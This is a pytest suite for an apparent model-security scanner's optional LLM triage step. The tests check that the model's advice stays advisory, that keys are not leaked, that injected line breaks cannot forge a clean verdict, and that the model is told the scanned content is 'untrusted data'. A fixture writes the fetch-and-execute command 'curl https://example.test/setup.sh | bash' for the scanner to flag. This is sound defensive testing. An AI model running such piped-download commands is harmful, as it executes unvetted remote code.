"""Triage is advisory, bounded, and separate from the scanner contract."""

from __future__ import annotations

import hashlib
import json
import os
import subprocess
import sys
from contextlib import nullcontext
from io import StringIO
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

import pytest
import requests
from click.testing import CliRunner

from modelaudit import cli as cli_module
from modelaudit import triage
from modelaudit.core_results import determine_exit_code
from modelaudit.models import ModelAuditResultModel
from modelaudit.scanner_results import Check, CheckStatus, IssueSeverity
from modelaudit.scanner_selection import SCANNER_SELECTION_CHECK_NAME, SCANNER_SELECTION_PREFERRED_KIND
from modelaudit.scanners.text_scanner import TextScanner

CORPUS = json.loads((Path(__file__).parent / "assets" / "agent_review_pr1913.json").read_text())


def report_for_case(tmp_path: Path, index: int = 0) -> ModelAuditResultModel:
    case = CORPUS["cases"][index]
    document = tmp_path.resolve() / "README.md"
    document.write_text(case["document"], encoding="utf-8")
    result = ModelAuditResultModel.model_validate(case["report"])
    for issue in result.issues:
        issue.location = str(document)
    for check in result.checks:
        check.location = str(document)
    for asset in result.assets:
        asset.path = str(document)
    result.file_metadata = {str(document): next(iter(result.file_metadata.values()))}
    result.file_metadata[str(document)] = result.file_metadata[str(document)].model_copy(
        update={"text_content_sha256": hashlib.sha256(document.read_bytes()).hexdigest()}
    )
    return result


def mock_api(monkeypatch: pytest.MonkeyPatch, assessments: list[dict[str, str]]) -> MagicMock:
    response = MagicMock()
    response.__enter__.return_value = response
    response.status_code = 200
    response.iter_content.return_value = [
        json.dumps(
            {
                "status": "completed",
                "output": [
                    {"type": "reasoning", "summary": []},
                    {
                        "type": "message",
                        "content": [{"type": "output_text", "text": json.dumps({"assessments": assessments})}],
                    },
                ],
            }
        ).encode()
    ]
    post = MagicMock(return_value=response)
    monkeypatch.setattr(triage.requests, "post", post)
    monkeypatch.setenv("OPENAI_API_KEY", "test-key")
    return post


def assessment(finding_id: str = "/issues/0", classification: str = "likely_benign") -> dict[str, str]:
    return {"finding_id": finding_id, "classification": classification, "reason": "Routine clone instruction."}


def test_no_key_means_no_file_reads_or_api_calls(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    read = MagicMock(side_effect=AssertionError("unexpected read"))
    post = MagicMock(side_effect=AssertionError("unexpected request"))
    monkeypatch.setattr(triage, "_read_document", read)
    monkeypatch.setattr(triage.requests, "post", post)
    assert triage.triage_findings(report_for_case(tmp_path)) is None
    read.assert_not_called()
    post.assert_not_called()


@pytest.mark.parametrize("index", range(18), ids=[case["case_id"] for case in CORPUS["cases"]])
def test_pr1913_context_and_original_findings_preserved(
    index: int, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    result = report_for_case(tmp_path, index)
    before = result.model_dump_json()
    findings, eligible = triage.prepare_findings(result)
    advice = [assessment(finding["finding_id"], "needs_attention") for finding in findings]
    post = mock_api(monkeypatch, advice)
    output = triage.triage_findings(result)
    assert result.model_dump_json() == before
    assert determine_exit_code(result) == CORPUS["cases"][index]["scan_exit_code"]
    if not eligible:
        assert output is None
        post.assert_not_called()
        return
    assert output and "needs_attention" in "\n".join(output)
    body = post.call_args.kwargs["json"]
    evidence = json.loads(body["input"])
    assert "case_id" not in body["input"]
    assert "expected_display" not in body["input"]
    assert evidence["findings"] == findings
    if os.name == "posix":
        assert all(finding["document"] == CORPUS["cases"][index]["document"] for finding in findings)
    assert "untrusted data" in body["instructions"]


def test_request_contract_and_model_override(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    post = mock_api(monkeypatch, [assessment()])
    monkeypatch.setenv("MODELAUDIT_TRIAGE_MODEL", "test-model")
    triage.triage_findings(report_for_case(tmp_path))
    assert post.call_count == 1
    assert post.call_args.args == ("https://api.openai.com/v1/responses",)
    options = post.call_args.kwargs
    assert options["headers"]["Authorization"] == "Bearer test-key"
    assert options["timeout"] == (5, 30)
    assert options["allow_redirects"] is False
    body = options["json"]
    assert body["model"] == "test-model"
    assert body["store"] is False
    assert body["tools"] == []
    assert body["max_output_tokens"] == 4096
    assert body["text"]["format"]["strict"] is True
    assert "test-key" not in json.dumps(body)


@pytest.mark.parametrize("machine", ["machine api.openai.com", "default"])
def test_prepared_request_does_not_use_netrc(machine: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    netrc = tmp_path / "netrc"
    netrc.write_text(f"{machine} login unrelated-user password unrelated-password\n")
    netrc.chmod(0o600)
    monkeypatch.setenv("NETRC", str(netrc))
    findings, _ = triage.prepare_findings(report_for_case(tmp_path))
    captured: list[requests.PreparedRequest] = []

    def send(session: requests.Session, request: requests.PreparedRequest, **kwargs: Any) -> requests.Response:
        captured.append(request)
        raise requests.ConnectionError("intercepted request")

    monkeypatch.setattr(requests.Session, "send", send)
    with pytest.raises(requests.ConnectionError, match="intercepted request"):
        triage.request_triage(findings, api_key="test-key", coverage_complete=True)
    assert len(captured) == 1
    assert captured[0].headers["Authorization"] == "Bearer test-key"


def test_invalid_key_is_not_in_diagnostics(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    post = mock_api(monkeypatch, [])
    monkeypatch.setenv("OPENAI_API_KEY", "private-key\ninvalid-header")
    echo = MagicMock()
    monkeypatch.setattr(cli_module.click, "echo", echo)
    cli_module._emit_triage(report_for_case(tmp_path))
    assert "printable ASCII" in echo.call_args.args[0]
    assert "private-key" not in echo.call_args.args[0]
    post.assert_not_called()


@pytest.mark.parametrize(
    "status,detail", [(401, "Invalid API key"), (404, "Model not found"), (429, "Quota exhausted")]
)
def test_api_error_diagnostics_preserve_status_and_body(
    status: int, detail: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    post = mock_api(monkeypatch, [])
    post.return_value.status_code = status
    post.return_value.iter_content.return_value = [f"{detail}\nprovider detail\x1b[2J".encode()]
    echo = MagicMock()
    monkeypatch.setattr(cli_module.click, "echo", echo)
    scanned = report_for_case(tmp_path)
    before = scanned.model_dump_json()
    cli_module._emit_triage(scanned)
    text = echo.call_args.args[0]
    assert f"OpenAI HTTP {status}: {detail}" in text
    assert r"\nprovider detail\x1b[2J" in text
    assert "\n" not in text
    assert scanned.model_dump_json() == before


@pytest.mark.parametrize("kind", ["non_text", "mixed", "missing_provenance", "other_name", "info"])
def test_only_verified_documentation_is_sent(kind: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    result = report_for_case(tmp_path)
    if kind == "non_text":
        result.assets[0].type = "pickle"
    elif kind == "mixed":
        result.assets.append(result.assets[0].model_copy(update={"type": "pickle"}))
    elif kind == "missing_provenance":
        result.file_metadata = {}
    elif kind == "other_name":
        result.issues[0].location = str(tmp_path / "model.pkl")
    else:
        result.issues[0].severity = IssueSeverity.INFO
    post = mock_api(monkeypatch, [])
    assert triage.triage_findings(result) is None
    post.assert_not_called()


@pytest.mark.parametrize("kind", ["missing", "oversized", "invalid_utf8", "incomplete_scan"])
def test_missing_context_or_coverage_cannot_get_benign_advice(
    kind: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    result = report_for_case(tmp_path)
    path = Path(result.assets[0].path)
    if kind == "missing":
        path.unlink()
    elif kind == "oversized":
        path.write_bytes(b"x" * (triage.MAX_DOCUMENT_BYTES + 1))
    elif kind == "invalid_utf8":
        path.write_bytes(b"\xff")
    else:
        result.has_errors = True
    mock_api(monkeypatch, [assessment()])
    output = triage.triage_findings(result)
    assert output and "inconclusive" in "\n".join(output) and "likely_benign" not in "\n".join(output)


def test_suppressed_preferred_scanner_prevents_benign_advice(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    result = report_for_case(tmp_path)
    result.checks.append(
        Check(
            name=SCANNER_SELECTION_CHECK_NAME,
            status=CheckStatus.SKIPPED,
            message="Preferred scanner excluded by selection",
            location=str(tmp_path / "model.pkl"),
            details={"kind": SCANNER_SELECTION_PREFERRED_KIND, "skipped_scanner_id": "pickle"},
        )
    )
    before = result.model_dump_json()
    post = mock_api(monkeypatch, [assessment()])
    output = "\n".join(triage.triage_findings(result) or [])
    assert json.loads(post.call_args.kwargs["json"]["input"])["coverage_complete"] is False
    assert "inconclusive" in output and "likely_benign" not in output
    assert result.model_dump_json() == before


@pytest.mark.skipif(os.name != "posix", reason="no-follow document reader is POSIX-only")
@pytest.mark.parametrize("ancestor", [False, True])
def test_documents_do_not_follow_symlinks(tmp_path: Path, ancestor: bool) -> None:
    real = tmp_path / "real"
    real.mkdir()
    target = real / "README.md"
    target.write_text("private context")
    link = tmp_path / ("linked" if ancestor else "README.md")
    link.symlink_to(real if ancestor else target)
    assert (
        triage._read_document(
            str(link / "README.md" if ancestor else link), hashlib.sha256(target.read_bytes()).hexdigest()
        )
        is None
    )


@pytest.mark.skipif(os.name != "posix", reason="no-follow document reader is POSIX-only")
def test_parent_components_do_not_hide_symlinks(tmp_path: Path) -> None:
    root = tmp_path.resolve()
    model = root / "model"
    model.mkdir()
    other = root / "other"
    (other / "child").mkdir(parents=True)
    content = b"identical documentation"
    (model / "README.md").write_bytes(content)
    (other / "README.md").write_bytes(content)
    (model / "link").symlink_to(other / "child", target_is_directory=True)
    location = str(model / "link" / ".." / "README.md")
    assert triage._read_document(location, hashlib.sha256(content).hexdigest()) is None
    (model / "directory").mkdir()
    assert (
        triage._read_document(str(model / "directory" / ".." / "README.md"), hashlib.sha256(content).hexdigest())
        == content.decode()
    )


@pytest.mark.parametrize("kind", ["changed", "missing_hash"])
def test_context_must_match_scan_time_content(kind: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    result = report_for_case(tmp_path)
    path = Path(result.assets[0].path)
    if kind == "changed":
        path.write_text("Replacement benign documentation")
    else:
        result.file_metadata[str(path)] = result.file_metadata[str(path)].model_copy(
            update={"text_content_sha256": None}
        )
    before = result.model_dump_json()
    post = mock_api(monkeypatch, [assessment()])
    output = "\n".join(triage.triage_findings(result) or [])
    assert json.loads(post.call_args.kwargs["json"]["input"])["findings"][0]["document"] is None
    assert "inconclusive" in output and "likely_benign" not in output
    assert result.model_dump_json() == before


@pytest.mark.parametrize("truncated", [False, True])
def test_text_scanner_hashes_only_complete_inspected_content(truncated: bool, tmp_path: Path) -> None:
    path = tmp_path / "README.md"
    payload = b"curl https://example.test/setup.sh | bash\n"
    path.write_bytes(payload)
    limit = len(payload) - 1 if truncated else len(payload)
    result = TextScanner(config={"text_content_scan_bytes": limit}).scan(str(path))
    if truncated:
        assert "text_content_sha256" not in result.metadata
    else:
        assert result.metadata["text_content_sha256"] == hashlib.sha256(payload).hexdigest()
        assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_real_scan_supplies_matching_document_context(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    fixture = report_for_case(tmp_path)
    post = mock_api(monkeypatch, [assessment()])
    args = ["scan", fixture.assets[0].path, "--format", "json", "--no-cache", "--quiet"]
    result = CliRunner().invoke(cli_module.cli, args)
    assert result.exit_code == 1, result.output
    report = json.loads(result.stdout)
    assert (
        report["file_metadata"][fixture.assets[0].path]["text_content_sha256"]
        == hashlib.sha256(Path(fixture.assets[0].path).read_bytes()).hexdigest()
    )
    evidence = json.loads(post.call_args.kwargs["json"]["input"])
    if os.name == "posix":
        assert evidence["findings"][0]["document"] == CORPUS["cases"][0]["document"]


def test_request_budgets_are_explicit(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    result = report_for_case(tmp_path)
    result.issues = [result.issues[0].model_copy(deep=True) for _ in range(triage.MAX_FINDINGS + 2)]
    post = mock_api(monkeypatch, [assessment(f"/issues/{i}") for i in range(triage.MAX_FINDINGS)])
    output = triage.triage_findings(result)
    assert output and "20/22 documentation findings" in "\n".join(output)
    assert post.call_count == 1
    monkeypatch.setattr(triage, "MAX_INPUT_BYTES", 1)
    post.reset_mock()
    assert "exceed the request limit" in "\n".join(triage.triage_findings(result) or [])
    post.assert_not_called()


@pytest.mark.parametrize(
    "advice",
    [
        [],
        [assessment("unknown")],
        [assessment(), assessment()],
        [assessment(classification="safe")],
        [{**assessment(), "reason": ""}],
        [{**assessment(), "suppress": "true"}],
    ],
)
def test_malformed_assessments_are_rejected(
    advice: list[dict[str, str]], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    result = report_for_case(tmp_path)
    before = result.model_dump_json()
    mock_api(monkeypatch, advice)
    with pytest.raises(ValueError):
        triage.triage_findings(result)
    assert result.model_dump_json() == before


@pytest.mark.parametrize(
    "body", [b"{}", b"not json", b'{"status":"incomplete"}', b"x" * (triage.MAX_RESPONSE_BYTES + 1)]
)
def test_invalid_or_incomplete_api_responses(body: bytes, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    post = mock_api(monkeypatch, [])
    post.return_value.iter_content.return_value = [body]
    with pytest.raises(ValueError):
        triage.triage_findings(report_for_case(tmp_path))


@pytest.mark.parametrize("output_format", ["text", "json", "sarif"])
@pytest.mark.parametrize("behavior", ["success", "timeout", "interrupt"])
def test_cli_preserves_reports_and_exit_codes(
    output_format: str, behavior: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    scanned = report_for_case(tmp_path)
    monkeypatch.setattr(cli_module, "scan_model_directory_or_file", lambda *a, **kw: scanned.model_copy(deep=True))
    monkeypatch.setattr(cli_module.time, "time", lambda: 123.0)
    runner = CliRunner()
    args = ["scan", scanned.assets[0].path, "--format", output_format, "--no-cache", "--quiet"]
    post = mock_api(monkeypatch, [assessment()])
    baseline = runner.invoke(cli_module.cli, [*args, "--no-triage"])
    post.assert_not_called()
    if behavior == "timeout":
        post.side_effect = requests.Timeout("test timeout")
    elif behavior == "interrupt":
        post.side_effect = KeyboardInterrupt()
    reviewed = runner.invoke(cli_module.cli, args)
    assert reviewed.exit_code == baseline.exit_code == 1, reviewed.output
    assert reviewed.stdout == baseline.stdout
    assert "AI triage" in reviewed.stderr
    assert post.call_count == 1


@pytest.mark.parametrize("exit_code", [0, 2])
def test_cli_preserves_clean_and_error_exits(exit_code: int, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    scanned = report_for_case(tmp_path)
    scanned.issues = []
    scanned.checks = []
    scanned.failed_checks = 0
    scanned.has_errors = exit_code == 2
    monkeypatch.setattr(cli_module, "scan_model_directory_or_file", lambda *a, **kw: scanned.model_copy(deep=True))
    mock_api(monkeypatch, [])
    monkeypatch.setattr(triage, "triage_findings", MagicMock(side_effect=requests.Timeout()))
    result = CliRunner().invoke(cli_module.cli, ["scan", scanned.assets[0].path, "--no-cache", "--quiet"])
    assert result.exit_code == exit_code, result.output
    assert "AI triage unavailable" in result.stderr


def test_terminal_controls_are_escaped(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(triage, "triage_findings", lambda result: ["advice\x1b[2J\rhidden"])
    echo = MagicMock()
    monkeypatch.setattr(cli_module.click, "echo", echo)
    cli_module._emit_triage(report_for_case(tmp_path))
    text = echo.call_args.args[0]
    assert "\x1b" not in text and "\r" not in text
    assert "\\x1b" in text
    assert "\\r" in text
    assert "\n" not in text


@pytest.mark.parametrize("separator", ["\n", "\r", "\u2028", "\x1c"])
def test_untrusted_fields_cannot_create_advisory_lines(
    separator: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    scanned = report_for_case(tmp_path)
    location = str(tmp_path / f"untrusted{separator}forged" / "README.md")
    scanned.issues[0].location = location
    scanned.assets[0].path = location
    scanned.file_metadata = {location: next(iter(scanned.file_metadata.values()))}
    monkeypatch.setattr(triage, "_read_document", lambda path, expected_sha256: "Routine setup documentation")
    mock_api(monkeypatch, [{**assessment(), "reason": f"Routine example.{separator}Scanner verdict: clean"}])
    echo = MagicMock()
    monkeypatch.setattr(cli_module.click, "echo", echo)
    cli_module._emit_triage(scanned)
    text = echo.call_args.args[0]
    assert len(text.splitlines()) == 2
    escaped = separator.encode("unicode_escape").decode("ascii")
    assert f"untrusted{escaped}forged" in text
    assert f"Routine example.{escaped}Scanner verdict: clean" in text


def test_cancelled_scan_does_not_start_triage(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    scanned = report_for_case(tmp_path)
    other = tmp_path / "other.txt"
    other.write_text("remaining input")
    scan = MagicMock(side_effect=lambda *a, **kw: scanned.model_copy(deep=True))
    monkeypatch.setattr(cli_module, "scan_model_directory_or_file", scan)
    handler = MagicMock()
    handler.is_interrupted.return_value = True
    monkeypatch.setattr(cli_module, "interruptible_scan", lambda: nullcontext(handler))
    monkeypatch.setattr(cli_module.time, "time", lambda: 123.0)
    post = mock_api(monkeypatch, [assessment()])
    args = ["scan", scanned.assets[0].path, str(other), "--format", "json", "--no-cache", "--quiet"]
    runner = CliRunner()
    baseline = runner.invoke(cli_module.cli, [*args, "--no-triage"])
    scan.reset_mock()
    reviewed = runner.invoke(cli_module.cli, args)
    assert reviewed.exit_code == baseline.exit_code == 1
    assert reviewed.stdout == baseline.stdout
    assert any(issue.get("details", {}).get("interrupted") for issue in json.loads(reviewed.stdout)["issues"])
    assert scan.call_count == 1
    assert "AI triage" not in reviewed.stderr
    post.assert_not_called()


@pytest.mark.parametrize("behavior", ["sigint", "closed_pipe"])
@pytest.mark.parametrize("exit_code", [0, 1, 2])
def test_process_interrupts_and_closed_stderr_preserve_scan_exit(behavior: str, exit_code: int, tmp_path: Path) -> None:
    scanned = report_for_case(tmp_path)
    if exit_code != 1:
        scanned.issues = []
        scanned.checks = []
        scanned.failed_checks = 0
        scanned.has_errors = exit_code == 2
    report_path = tmp_path / "report.json"
    report_path.write_text(scanned.model_dump_json())
    marker = tmp_path / "triage-invoked"
    script = """
import signal, sys
from pathlib import Path
from modelaudit import __main__ as entry, cli, triage
from modelaudit.models import ModelAuditResultModel
report = ModelAuditResultModel.model_validate_json(Path(sys.argv[1]).read_text())
behavior, enabled, marker = sys.argv[2:5]
def advice(result):
    Path(marker).write_text('invoked')
    if behavior == 'sigint':
        signal.raise_signal(signal.SIGINT)
    return ['AI triage (advisory): test advice']
triage.triage_findings = advice
cli.scan_model_directory_or_file = lambda *a, **kw: report.model_copy(deep=True)
cli.time.time = lambda: 123.0
sys.argv = ['modelaudit', 'scan', report.assets[0].path, '--format', 'json', '--no-cache', '--quiet']
if enabled == 'no':
    sys.argv.append('--no-triage')
entry._run()
"""
    environment = {
        **os.environ,
        "PYTHONPATH": str(Path(cli_module.__file__).resolve().parents[1]),
        "OPENAI_API_KEY": "test-key",
        "PROMPTFOO_DISABLE_TELEMETRY": "1",
    }
    pipe_write: int | None = None
    if behavior == "closed_pipe":
        pipe_read, pipe_write = os.pipe()
        os.close(pipe_read)
    runs: list[subprocess.CompletedProcess[str]] = []
    try:
        for enabled in ("no", "yes"):
            runs.append(
                subprocess.run(
                    [sys.executable, "-c", script, str(report_path), behavior, enabled, str(marker)],
                    cwd=tmp_path,
                    env=environment,
                    stdout=subprocess.PIPE,
                    stderr=pipe_write if pipe_write is not None else subprocess.PIPE,
                    text=True,
                    timeout=30,
                    check=False,
                )
            )
            assert marker.exists() is (enabled == "yes")
    finally:
        if pipe_write is not None:
            os.close(pipe_write)
    assert [run.returncode for run in runs] == [exit_code, exit_code], [run.stderr for run in runs]
    assert runs[0].stdout == runs[1].stdout
    if behavior == "sigint":
        assert "AI triage unavailable" in runs[1].stderr


def test_dry_run_never_calls_triage(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    scanned = report_for_case(tmp_path)
    post = mock_api(monkeypatch, [])
    result = CliRunner().invoke(cli_module.cli, ["scan", scanned.assets[0].path, "--dry-run", "--no-cache", "--quiet"])
    assert result.exit_code == determine_exit_code(scanned), result.output
    post.assert_not_called()


@pytest.mark.parametrize("error", [BrokenPipeError(), KeyboardInterrupt()])
def test_triage_output_failure_does_not_abort_scan(
    error: BaseException, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    scanned = report_for_case(tmp_path)
    before = scanned.model_dump_json()
    monkeypatch.setattr(triage, "triage_findings", lambda result: ["Advice"])
    monkeypatch.setattr(cli_module.click, "echo", MagicMock(side_effect=error))
    monkeypatch.setattr(cli_module.sys, "stderr", StringIO())
    cli_module._emit_triage(scanned)
    assert scanned.model_dump_json() == before
